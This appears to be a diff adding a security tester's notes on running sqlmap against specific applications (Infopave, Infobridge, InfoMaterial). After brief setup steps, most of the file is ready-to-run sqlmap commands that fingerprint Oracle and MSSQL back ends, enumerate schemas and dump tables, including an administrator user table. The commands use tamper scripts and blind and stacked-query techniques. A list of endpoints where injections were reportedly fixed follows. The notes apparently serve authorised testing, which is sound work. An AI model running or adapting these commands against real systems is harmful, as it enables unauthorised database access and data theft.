@@ -1,0 +1,137 @@
+output file which contains the cache for the requests: C:\Users\azlan.malik.IEP\AppData\Local\sqlmap\output
+
+
+1.Install Python 
+2.place the sqlmap folder in the installed python filder 
+3.go into the sql map folder and infront of sqlmap.py right click and click on open in terminal.
+NOTE: this allows the sqlmap.py file to be directly opened in the cmd terminal instead of manually and dragging the file into the cmd terminal
+4.python = to execute the sqlmap.py 
+5.sqlmap.py -r = to run the command library
+6.the file name that contains the API post or get requests. in the JSON format
+7.'--random-agent' these and all associated are python sqlmap keywords
+8.Always verify the site feature and from sqlmapp when performing security testing
+
+Standard examples: 
+
+--> Infopave
+python sqlmap.py -r validation_step_01_01.txt --force-ssl --random-agent --dbms=oracle --batch --no-cast --sql-query='SELECT name from V$DATABASE'
+python sqlmap.py -r validation_step_01_01.txt --force-ssl --random-agent --dbms=oracle --batch --no-cast --sql-query='SELECT table_name FROM USER_TAB_COLUMNS' -D ORCL
+python sqlmap.py -r validation_step_01_01.txt --force-ssl --random-agent --dbms=oracle --batch --no-cast --sql-query='SELECT column_name FROM USER_TAB_COLUMNS' -D ORCL
+python sqlmap.py -r validation_step_01_01.txt --force-ssl --random-agent --dbms=oracle --batch --no-cast --sql-query='SELECT SENSOR_OFFSET_X3_MM FROM FWD_DEF_SUBGRADE_GRAPH' -D ORCL
+python sqlmap.py -r validation_step_01_01.txt --force-ssl --random-agent --dbms=oracle --batch --no-cast --sql-query='SELECT version FROM v$instance'
+python sqlmap.py -r validation_step_01_01.txt --force-ssl --random-agent --dbms=oracle --batch --no-cast --sql-query='SELECT host_name FROM v$instance'
+Python sqlmap.py -r validation_step_02_01.txt --force-ssl --random-agent --dbms=mssql --batch --current-db
+python sqlmap.py -r validation_step_02_01.txt --force-ssl --random-agent --dbms=oracle --batch --current-db
+Python sqlmap.py -r validation_step_02_01.txt --force-ssl --random-agent --dbms=oracle --batch -D INFOPAVE --tables
+Python sqlmap.py -r validation_step_02_01.txt --force-ssl --random-agent --dbms=oracle --batch -D INFOPAVE -T 'PCC_JOINT_FORMING_EXP' --columns
+Python sqlmap.py -r validation_step_02_01.txt --force-ssl --random-agent --dbms=oracle --batch -D INFOPAVE -T 'PCC_JOINT_FORMING_EXP' -C 'PCC_JOINT_FORMING_ID' --dump
+python sqlmap.py -r validation_step_02_01.txt --dbms oracle --risk 2 --level 5 --random-agent --force-ssl --batch --hex --tamper space2comment -D MERRA_TOOL -T MERRA_PRODUCT_URL_2023 -C PRODUCT_URL_ID --start 1 --stop 1 --dump --test-filter "Oracle AND time-based blind"
+python sqlmap.py -r validation_step_02_01.txt --dbms oracle --risk 2 --level 5 --random-agent --force-ssl --batch --hex --tamper space2comment -D MERRA_TOOL -T MERRA_PRODUCT_URL_2023 -C PRODUCT_URL_ID --start 1 --stop 1 --dump --test-filter "AND boolean-based blind - WHERE or HAVING clause"
+python sqlmap.py -r validation_step_02_01.txt --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0" --level=5 --risk=2 --threads=1 --force-ssl --dbms=oracle -p "tableName"
+python sqlmap.py -r validation_step_02_01.txt --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0" --level=5 --risk=2 --threads=1 --force-ssl --dbms=oracle -p "tableName" -D "INFOPAVE" -T "PCC_JOINT_FORMING_EXP" -C "PCC_JOINT_FORMING_ID" --start=1 --stop=1 --dump
+python sqlmap.py -r validation_step_02_01.txt --force-ssl --random-agent --level 3 --risk 2 --batch --test-filter='Oracle time-based blind - Parameter replace (DBMS_PIPE.RECEIVE_MESSAGE)'
+python sqlmap.py -r validation_step_02_01.txt --force-ssl --random-agent --level 3 --risk 2 --batch --test-filter='Oracle time-based blind - Parameter replace (DBMS_PIPE.RECEIVE_MESSAGE)' --dbms Oracle -D INFOPAVE --tables --no-cast
+python sqlmap.py -r validation_step_02_01.txt --force-ssl --random-agent --level 3 --risk 2 --batch --test-filter='Oracle time-based blind - Parameter replace (DBMS_PIPE.RECEIVE_MESSAGE)' --dbms Oracle -D INFOPAVE -T LTPPDD_OLD --columns --no-cast
+python sqlmap.py -r validation_step_02_01.txt --force-ssl --random-agent --dbms oracle --level 3 --risk 2 --batch --current-db 
+python sqlmap.py -r validation_step_02_01.txt --force-ssl --random-agent --dbms oracle --level 3 --risk 2 --batch --no-cast -D 'INFOPAVE' --tables
+python sqlmap.py -r validation_step_02_01.txt --force-ssl --random-agent --dbms oracle --level 3 --risk 2 --batch --no-cast -D 'INFOPAVE' -T 'LIP_GSA_FEEDBACK' --columns
+python sqlmap.py -r validation_step_02_01.txt --force-ssl --random-agent --dbms oracle --level 3 --risk 2 --batch --no-cast -D 'INFOPAVE' -T 'LIP_GSA_FEEDBACK' -C 'GSA_FEEDBACK_ID' --dump   
+
+--> Infobridge
+
+Python sqlmap.py -r validation_step_01_01.txt --force-ssl --random-agent --batch --dbms=mssql -D LTBP_INFOBRIDGE --tables
+Python sqlmap.py -r validation_step_01_01.txt --force-ssl --random-agent --batch --no-cast --dbms=mssql --delay 1 --current-db
+Python sqlmap.py -r validation_step_01_01.txt --force-ssl --random-agent --batch --no-cast --dbms=mssql -D LTBP_INFOBRIDGE --tables
+Python sqlmap.py -r validation_step_01_01.txt --force-ssl --random-agent --batch --dbms=mssql -D LTBP_INFOBRIDGE -T 'dbo.ADM_CODE_ITEMS' -C 'CODE' --dump
+Python sqlmap.py -r validation_step_01_01.txt --force-ssl --random-agent --batch --dbms=mssql -D LTBP_INFOBRIDGE -T 'dbo.ADM_CODE_ITEMS' --columns
+Python sqlmap.py -r validation_step_01_01.txt --force-ssl --random-agent --batch --dbms=mssql --current-db
+Python sqlmap.py -r validation_step_01_01.txt --force-ssl --random-agent --dbms=mssql --batch -D 'LTBP_INFOBRIDGE' -T 'dbo.ADM_CODE_ITEMS' -C 'CODE' --dump
+Python sqlmap.py -r validation_step_01_01.txt --force-ssl --random-agent --dbms=mssql --batch --test-filter='Microsoft SQL Server/Sybase stacked queries (comment)' -p 'selectedAttributeXId' --current-db
+Python sqlmap.py -r validation_step_01_01.txt --force-ssl --random-agent --dbms=mssql --batch --test-filter='Microsoft SQL Server/Sybase stacked queries (comment)' -p 'selectedAttributeXId' -D 'LTBP_INFOBRIDGE' -T 'dbo.ADM_CODE_ITEMS' -C 'CODE' --dump
+Python sqlmap.py -r validation_step_01_01.txt --force-ssl --random-agent --dbms=mssql --batch --test-filter='Microsoft SQL Server/Sybase stacked queries (comment)' -p 'selectedAttributeXId' -D 'LTBP_INFOBRIDGE' -T 'dbo.ADM_CODE_ITEMS' --columns
+Python sqlmap.py -r validation_step_01_01.txt --force-ssl --random-agent --dbms=mssql --batch --test-filter='Microsoft SQL Server/Sybase stacked queries (comment)' -p 'selectedAttributeXId' -D 'LTBP_INFOBRIDGE' --tables
+Python sqlmap.py -r validation_step_01_01.txt --force-ssl --random-agent --dbms=mssql --batch -p SortIndex --current-db
+Python sqlmap.py -r validation_step_01_01.txt --force-ssl --random-agent --dbms=mssql --batch -p SortIndex -D 'LTBP_INFOBRIDGE' --tables
+Python sqlmap.py -r validation_step_01_01.txt --force-ssl --random-agent --dbms=mssql --batch -p SortIndex -D 'LTBP_INFOBRIDGE' -T 'dbo.ADM_CODE_ITEMS' --columns
+Python sqlmap.py -r validation_step_01_01.txt --force-ssl --random-agent --dbms=mssql --batch -p SortIndex -D 'LTBP_INFOBRIDGE' -T 'dbo.ADM_CODE_ITEMS' -C 'CODE' --dump
+Python sqlmap.py -r validation_step_01_01.txt --force-ssl --random-agent --dbms=mssql --batch -D 'LTBP_INFOBRIDGE' --tables
+Python sqlmap.py -r validation_step_01_01.txt --force-ssl --random-agent --dbms=mssql --batch -D 'LTBP_INFOBRIDGE' -T 'dbo.ADM_CODE_ITEMS' --columns
+Python sqlmap.py -r validation_step_01_01.txt --force-ssl --random-agent --dbms=mssql --batch -D 'LTBP_INFOBRIDGE' -T 'dbo.ADM_CODE_ITEMS' -C 'CODE' --dump
+Python sqlmap.py -r validation_step_01_01.txt --force-ssl --random-agent --dbms=mssql --batch -p YearFrom --current-db
+Python sqlmap.py -r validation_step_01_01.txt --force-ssl --random-agent --dbms=mssql --batch -p YearFrom -D 'LTBP_INFOBRIDGE' --tables
+Python sqlmap.py -r validation_step_01_01.txt --force-ssl --random-agent --dbms=mssql --batch -p YearFrom -D 'LTBP_INFOBRIDGE' -T 'ADM_CODE_ITEMS' --columns
+Python sqlmap.py -r validation_step_01_01.txt --force-ssl --random-agent --dbms=mssql --batch -p YearFrom -D 'LTBP_INFOBRIDGE' -T 'ADM_CODE_ITEMS' -C 'CODE' --dump
+Python sqlmap.py -r validation_step_01_01.txt --force-ssl --random-agent --dbms=mssql --batch -p years --current-db
+Python sqlmap.py -r validation_step_01_01.txt --force-ssl --random-agent --dbms=mssql --batch -p years -D 'LTBP_INFOBRIDGE' --tables
+Python sqlmap.py -r validation_step_01_01.txt --force-ssl --random-agent --dbms=mssql --batch -p years -D 'LTBP_INFOBRIDGE' -T 'ADM_CODE_ITEMS' --columns
+Python sqlmap.py -r validation_step_01_01.txt --force-ssl --random-agent --dbms=mssql --batch -p years -D 'LTBP_INFOBRIDGE' -T 'ADM_CODE_ITEMS' -C 'CODE' --dump
+Python sqlmap.py -r validation_step_01_01.txt --random-agent --batch --force-ssl --batch --dbms=mssql -p LocationSearched
+Python sqlmap.py -r validation_step_01_01.txt --random-agent --batch --force-ssl --batch --dbms=mssql -p LocationSearched --sql-query='@@SERVERNAME'
+Python sqlmap.py -r validation_step_01_01.txt --random-agent --batch --force-ssl --dbms=mssql --delay 1 -p pageSize --current-db
+Python sqlmap.py -r validation_step_01_01.txt --random-agent --batch --force-ssl --dbms=mssql -p pageSize -D 'LTBP_INFOBRIDGE' --tables
+Python sqlmap.py -r validation_step_01_01.txt --random-agent --batch --force-ssl --dbms=mssql -p pageSize -D 'LTBP_INFOBRIDGE' -T 'dbo.ADM_CODE_ITEMS' --columns
+Python sqlmap.py -r validation_step_01_01.txt --random-agent --batch --force-ssl --dbms=mssql -p pageSize -D 'LTBP_INFOBRIDGE' -T 'dbo.ADM_CODE_ITEMS' -C 'CODE' --dump
+Python sqlmap.py -r validation_step_01_01.txt --force-ssl --random-agent --batch --dbms=mssql --current-db
+Python sqlmap.py -r validation_step_01_01.txt --force-ssl --random-agent --batch --dbms=mssql -D 'LTBP_INFOBRIDGE' --tables
+Python sqlmap.py -r validation_step_01_01.txt --force-ssl --random-agent --batch --dbms=mssql -D 'LTBP_INFOBRIDGE' -T 'ADM_USER' --columns
+Python sqlmap.py -r validation_step_01_01.txt --force-ssl --random-agent --batch --dbms=mssql -D 'LTBP_INFOBRIDGE' -T 'ADM_USER' -C 'USER_ID' --dump
+
+other places in infobridge where own our own dev has fixed the injections:
+
+Done:
+
+Feature: 
+Main Data Grid:
+calls:
+Data/GetAllBridges
+Data/ResetAllBridges
+Data/GetCustomGrid
+
+Overview:
+Data/getBridgeInformation
+Data/getOverViewAvailbilityData
+
+NBI:
+Data/getBridgeNBIGraphData
+
+Climate:
+Data/getBridgeClimateGraphData
+
+Map:
+Data/GetMapDetails
+ 
+Performance Forecast - Bridge Condition Transition Forecast:
+Data/GetForecastTransition
+
+Performance History - Bridge Condition Transition History:
+Data/GetTransitionHistory
+
+Performance History - Bridge Performance Measures:
+Data/PerformanceGraphs
+Data/getCountLineChart
+ 
+Performance Forecast - Network Performance Forecast:
+Data/PerformanceGraphs
+Data/getCountLineChart
+
+Analytics - Charts:
+Analytics/GetAnalyticsData
+
+Analytics - Bridge Condition by state:
+Analytics/GetMapChartDatade
+ 
+Analytics - Asset Valuation by state:
+Analytics/GetAssetValuationStateData
+
+Tools - Asset Valuation:
+Analytics/GetAssetValuationData
+ 
+ 
+ 
+--> InfoMaterial
+
+python sqlmap.py -r validation_step_04_01.txt --technique=B --risk=2 --level=3 --force-ssl --dbms=mssql --technique=S --time-sec 5 --batch  -D LTBP_INFOBRIDGE -T dbo.ADM_CODE_ITEMS -C ITEM --dump --start=1 --stop=4 
+ 
+ 
+ 
+ 
